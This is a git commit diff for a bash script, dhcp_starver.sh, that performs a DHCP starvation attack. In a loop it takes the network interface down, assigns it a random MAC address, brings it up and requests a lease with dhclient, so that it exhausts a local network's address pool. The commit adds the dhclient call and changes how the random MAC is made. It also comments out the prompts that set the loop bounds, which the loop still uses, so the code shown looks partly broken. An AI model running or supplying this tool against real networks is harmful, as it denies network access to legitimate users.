d64745b4fa6d625c161fa802b828479729582774
Olorunfemi-Ojo Tomiwa <37912743+Tropes-Ot@users.noreply.github.com>
2020-08-03 12:22:07 -0700

    Update dhcp_starver.sh

--- dhcp_starver.sh
+++ dhcp_starver.sh
@@ -12,27 +12,28 @@ else
 	oip=$(ifconfig $1 | grep netmask | grep -Po '(?<=inet )[\d.]+')
 	onetmask=$(ifconfig $1 | grep netmask | grep -Po '(?<=netmask )[\d.]+')
 	omac=$(ifconfig $1 | grep ether | grep -Po '(?<=ether )[\w.]+')
-	ipthirdoctet=$(ifconfig $1 |grep netmask|grep -Po '(?<=inet )[\d.]+'|cut -d "." -f 3)
+	#ipthirdoctet=$(ifconfig $1 |grep netmask|grep -Po '(?<=inet )[\d.]+'|cut -d "." -f 3)
 	if [ $? -ne 0 ]
 	then
 		echo "[*] Invalid interface"
 	else
-		echo "Current ip: $oip"
-		echo "Subnet: $onetmask"
-		echo "Mac Address: $omac"
-		echo "Specify start host id: "
-		read start
-		echo "Specify stop host id: "
-		read stop
+		echo "[+] Current ip: $oip"
+		echo "[+] Subnet: $onetmask"
+		echo "[+] Mac Address: $omac"
+		#echo "[+] Specify start host id: "
+		#read start
+		#echo "[+] Specify stop host id: "
+		#read stop
 		#diff=$(expr $stop - $start)
 		for (( i=$start; i <= $stop; i++ ));
 		do
 			printf "."
 			ifconfig $1 down
-			randmac=$(echo 00:60:2F:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
-			ifconfig $1 192.168.${ipthirdoctet}.${i} netmask $onetmask
+			randmac=$(echo $[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+			#ifconfig $1 192.168.${ipthirdoctet}.${i} netmask $onetmask
 			ifconfig $1 hw ether $randmac
 			ifconfig $1 up
+			dhclient $1
 		done
 		ifconfig $1 down
 		ifconfig $1 hw ether $omac
